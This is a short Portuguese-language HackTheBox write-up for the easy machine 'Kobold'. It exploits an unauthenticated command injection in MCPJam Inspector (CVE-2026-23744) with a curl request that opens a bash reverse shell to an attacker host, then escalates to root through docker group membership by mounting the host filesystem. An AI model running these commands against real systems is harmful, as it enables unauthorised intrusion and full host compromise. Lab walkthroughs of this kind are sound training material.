Kobold

HackTheBox, Easy

Kobold explora uma RCE não autenticada em uma ferramenta de gerenciamento (MCPJam Inspector, CVE-2026-23744) exposta em porta alta, e escala a root abusando de uma associação ao grupo docker por meio de uma fuga de container clássica.

Reconhecimento

O Nmap revela SSH, nginx (80/443) e um serviço não reconhecido na porta 3552, a plataforma Arcane de gerenciamento de contêineres, que embute o MCPJam Inspector.

sudo nmap -sS -sV -p- -Pn <IP>
# 22, 80, 443, 3552 (Arcane / MCPJam Inspector)

Exploração - CVE-2026-23744

O endpoint /api/mcp/connect do MCPJam Inspector v1.4.2 passa a entrada diretamente ao shell, sem autenticação nem sanitização. Um pedido forjado executa comandos e entrega uma reverse shell como o usuário ben.

curl -X POST http://<IP>:3552/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{"command":"bash -c \"bash -i >& /dev/tcp/<MEU_IP>/4444 0>&1\""}'
nc -lvnp 4444

Escalação - grupo docker

O usuário ben pertence (de forma dormente) ao grupo docker. Ativando o grupo com newgrp docker, sobe-se um contêiner privilegiado que monta o sistema de arquivos do host, como o processo roda como root no contêiner, lê-se qualquer arquivo do host.

id
newgrp docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
cat /root/root.txt
